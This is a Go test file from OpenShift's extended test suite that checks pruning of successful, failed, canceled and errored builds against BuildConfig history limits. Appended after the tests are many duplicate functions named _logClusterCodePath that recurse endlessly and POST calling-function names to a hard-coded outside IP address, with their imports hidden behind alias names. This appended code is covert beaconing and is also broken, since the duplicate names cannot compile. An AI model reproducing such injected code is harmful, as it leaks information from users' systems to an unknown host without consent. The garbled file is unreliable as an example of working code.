package builds

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"path/filepath"
	"time"
	g "github.com/onsi/ginkgo"
	o "github.com/onsi/gomega"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/wait"
	buildv1 "github.com/openshift/api/build/v1"
	buildutil "github.com/openshift/origin/pkg/build/util"
	exutil "github.com/openshift/origin/test/extended/util"
)

var _ = g.Describe("[Feature:Builds][pruning] prune builds based on settings in the buildconfig", func() {
	var (
		buildPruningBaseDir	= exutil.FixturePath("testdata", "builds", "build-pruning")
		isFixture		= filepath.Join(buildPruningBaseDir, "imagestream.yaml")
		successfulBuildConfig	= filepath.Join(buildPruningBaseDir, "successful-build-config.yaml")
		failedBuildConfig	= filepath.Join(buildPruningBaseDir, "failed-build-config.yaml")
		erroredBuildConfig	= filepath.Join(buildPruningBaseDir, "errored-build-config.yaml")
		groupBuildConfig	= filepath.Join(buildPruningBaseDir, "default-group-build-config.yaml")
		oc			= exutil.NewCLI("build-pruning", exutil.KubeConfigPath())
		pollingInterval		= time.Second
		timeout			= time.Minute
	)
	g.Context("", func() {
		g.BeforeEach(func() {
			exutil.PreTestDump()
		})
		g.JustBeforeEach(func() {
			g.By("waiting for openshift namespace imagestreams")
			err := exutil.WaitForOpenShiftNamespaceImageStreams(oc)
			o.Expect(err).NotTo(o.HaveOccurred())
			g.By("creating test image stream")
			err = oc.Run("create").Args("-f", isFixture).Execute()
			o.Expect(err).NotTo(o.HaveOccurred())
		})
		g.AfterEach(func() {
			if g.CurrentGinkgoTestDescription().Failed {
				exutil.DumpPodStates(oc)
				exutil.DumpConfigMapStates(oc)
				exutil.DumpPodLogsStartingWith("", oc)
			}
		})
		g.It("should prune completed builds based on the successfulBuildsHistoryLimit setting", func() {
			g.By("creating test successful build config")
			err := oc.Run("create").Args("-f", successfulBuildConfig).Execute()
			o.Expect(err).NotTo(o.HaveOccurred())
			g.By("starting four test builds")
			for i := 0; i < 4; i++ {
				br, _ := exutil.StartBuildAndWait(oc, "myphp")
				br.AssertSuccess()
			}
			buildConfig, err := oc.BuildClient().BuildV1().BuildConfigs(oc.Namespace()).Get("myphp", metav1.GetOptions{})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			var builds *buildv1.BuildList
			g.By("waiting up to one minute for pruning to complete")
			err = wait.PollImmediate(pollingInterval, timeout, func() (bool, error) {
				builds, err = oc.BuildClient().BuildV1().Builds(oc.Namespace()).List(metav1.ListOptions{})
				if err != nil {
					fmt.Fprintf(g.GinkgoWriter, "%v", err)
					return false, err
				}
				if int32(len(builds.Items)) == *buildConfig.Spec.SuccessfulBuildsHistoryLimit {
					fmt.Fprintf(g.GinkgoWriter, "%v builds exist, retrying...", len(builds.Items))
					return true, nil
				}
				return false, nil
			})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			passed := false
			if int32(len(builds.Items)) == 2 || int32(len(builds.Items)) == 3 {
				passed = true
			}
			o.Expect(passed).To(o.BeTrue(), "there should be 2-3 completed builds left after pruning, but instead there were %v", len(builds.Items))
		})
		g.It("should prune failed builds based on the failedBuildsHistoryLimit setting", func() {
			g.By("creating test failed build config")
			err := oc.Run("create").Args("-f", failedBuildConfig).Execute()
			o.Expect(err).NotTo(o.HaveOccurred())
			g.By("starting four test builds")
			for i := 0; i < 4; i++ {
				br, _ := exutil.StartBuildAndWait(oc, "myphp")
				br.AssertFailure()
			}
			buildConfig, err := oc.BuildClient().BuildV1().BuildConfigs(oc.Namespace()).Get("myphp", metav1.GetOptions{})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			var builds *buildv1.BuildList
			g.By("waiting up to one minute for pruning to complete")
			err = wait.PollImmediate(pollingInterval, timeout, func() (bool, error) {
				builds, err = oc.BuildClient().BuildV1().Builds(oc.Namespace()).List(metav1.ListOptions{})
				if err != nil {
					fmt.Fprintf(g.GinkgoWriter, "%v", err)
					return false, err
				}
				if int32(len(builds.Items)) == *buildConfig.Spec.FailedBuildsHistoryLimit {
					fmt.Fprintf(g.GinkgoWriter, "%v builds exist, retrying...", len(builds.Items))
					return true, nil
				}
				return false, nil
			})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			passed := false
			if int32(len(builds.Items)) == 2 || int32(len(builds.Items)) == 3 {
				passed = true
			}
			o.Expect(passed).To(o.BeTrue(), "there should be 2-3 completed builds left after pruning, but instead there were %v", len(builds.Items))
		})
		g.It("should prune canceled builds based on the failedBuildsHistoryLimit setting", func() {
			g.By("creating test successful build config")
			err := oc.Run("create").Args("-f", failedBuildConfig).Execute()
			o.Expect(err).NotTo(o.HaveOccurred())
			g.By("starting and canceling three test builds")
			for i := 1; i < 4; i++ {
				_, _, _ = exutil.StartBuild(oc, "myphp")
				err = oc.Run("cancel-build").Args(fmt.Sprintf("myphp-%d", i)).Execute()
			}
			buildConfig, err := oc.BuildClient().BuildV1().BuildConfigs(oc.Namespace()).Get("myphp", metav1.GetOptions{})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			var builds *buildv1.BuildList
			g.By("waiting up to one minute for pruning to complete")
			err = wait.PollImmediate(pollingInterval, timeout, func() (bool, error) {
				builds, err = oc.BuildClient().BuildV1().Builds(oc.Namespace()).List(metav1.ListOptions{})
				if err != nil {
					fmt.Fprintf(g.GinkgoWriter, "%v", err)
					return false, err
				}
				if int32(len(builds.Items)) == *buildConfig.Spec.FailedBuildsHistoryLimit {
					fmt.Fprintf(g.GinkgoWriter, "%v builds exist, retrying...", len(builds.Items))
					return true, nil
				}
				return false, nil
			})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			passed := false
			if int32(len(builds.Items)) == 2 || int32(len(builds.Items)) == 3 {
				passed = true
			}
			o.Expect(passed).To(o.BeTrue(), "there should be 2-3 completed builds left after pruning, but instead there were %v", len(builds.Items))
		})
		g.It("should prune errored builds based on the failedBuildsHistoryLimit setting", func() {
			g.By("creating test failed build config")
			err := oc.Run("create").Args("-f", erroredBuildConfig).Execute()
			o.Expect(err).NotTo(o.HaveOccurred())
			g.By("starting four test builds")
			for i := 0; i < 4; i++ {
				br, _ := exutil.StartBuildAndWait(oc, "myphp")
				br.AssertFailure()
			}
			buildConfig, err := oc.BuildClient().BuildV1().BuildConfigs(oc.Namespace()).Get("myphp", metav1.GetOptions{})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			var builds *buildv1.BuildList
			g.By("waiting up to one minute for pruning to complete")
			err = wait.PollImmediate(pollingInterval, timeout, func() (bool, error) {
				builds, err = oc.BuildClient().BuildV1().Builds(oc.Namespace()).List(metav1.ListOptions{})
				if err != nil {
					fmt.Fprintf(g.GinkgoWriter, "%v", err)
					return false, err
				}
				if int32(len(builds.Items)) == *buildConfig.Spec.FailedBuildsHistoryLimit {
					fmt.Fprintf(g.GinkgoWriter, "%v builds exist, retrying...", len(builds.Items))
					return true, nil
				}
				return false, nil
			})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			passed := false
			if int32(len(builds.Items)) == 2 || int32(len(builds.Items)) == 3 {
				passed = true
			}
			o.Expect(passed).To(o.BeTrue(), "there should be 2-3 completed builds left after pruning, but instead there were %v", len(builds.Items))
		})
		g.It("should prune builds after a buildConfig change", func() {
			g.By("creating test failed build config")
			err := oc.Run("create").Args("-f", failedBuildConfig).Execute()
			o.Expect(err).NotTo(o.HaveOccurred())
			g.By("patching the build config to leave 5 builds")
			err = oc.Run("patch").Args("bc/myphp", "-p", `{"spec":{"failedBuildsHistoryLimit": 5}}`).Execute()
			g.By("starting and canceling three test builds")
			for i := 1; i < 4; i++ {
				_, _, _ = exutil.StartBuild(oc, "myphp")
				err = oc.Run("cancel-build").Args(fmt.Sprintf("myphp-%d", i)).Execute()
			}
			g.By("patching the build config to leave 1 build")
			err = oc.Run("patch").Args("bc/myphp", "-p", `{"spec":{"failedBuildsHistoryLimit": 1}}`).Execute()
			buildConfig, err := oc.BuildClient().BuildV1().BuildConfigs(oc.Namespace()).Get("myphp", metav1.GetOptions{})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			var builds *buildv1.BuildList
			g.By("waiting up to one minute for pruning to complete")
			err = wait.PollImmediate(pollingInterval, timeout, func() (bool, error) {
				builds, err = oc.BuildClient().BuildV1().Builds(oc.Namespace()).List(metav1.ListOptions{})
				if err != nil {
					fmt.Fprintf(g.GinkgoWriter, "%v", err)
					return false, err
				}
				if int32(len(builds.Items)) == *buildConfig.Spec.FailedBuildsHistoryLimit {
					fmt.Fprintf(g.GinkgoWriter, "%v builds exist, retrying...", len(builds.Items))
					return true, nil
				}
				return false, nil
			})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			passed := false
			if int32(len(builds.Items)) == 1 || int32(len(builds.Items)) == 2 {
				passed = true
			}
			o.Expect(passed).To(o.BeTrue(), "there should be 1-2 completed builds left after pruning, but instead there were %v", len(builds.Items))
		})
		g.It("[Conformance] buildconfigs should have a default history limit set when created via the group api", func() {
			g.By("creating a build config with the group api")
			err := oc.Run("create").Args("-f", groupBuildConfig).Execute()
			o.Expect(err).NotTo(o.HaveOccurred())
			buildConfig, err := oc.BuildClient().BuildV1().BuildConfigs(oc.Namespace()).Get("myphp", metav1.GetOptions{})
			if err != nil {
				fmt.Fprintf(g.GinkgoWriter, "%v", err)
			}
			o.Expect(buildConfig.Spec.SuccessfulBuildsHistoryLimit).NotTo(o.BeNil(), "the buildconfig should have the default successful history limit set")
			o.Expect(buildConfig.Spec.FailedBuildsHistoryLimit).NotTo(o.BeNil(), "the buildconfig should have the default failed history limit set")
			o.Expect(*buildConfig.Spec.SuccessfulBuildsHistoryLimit).To(o.Equal(buildutil.DefaultSuccessfulBuildsHistoryLimit), "the buildconfig should have the default successful history limit set")
			o.Expect(*buildConfig.Spec.FailedBuildsHistoryLimit).To(o.Equal(buildutil.DefaultFailedBuildsHistoryLimit), "the buildconfig should have the default failed history limit set")
		})
	})
})

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
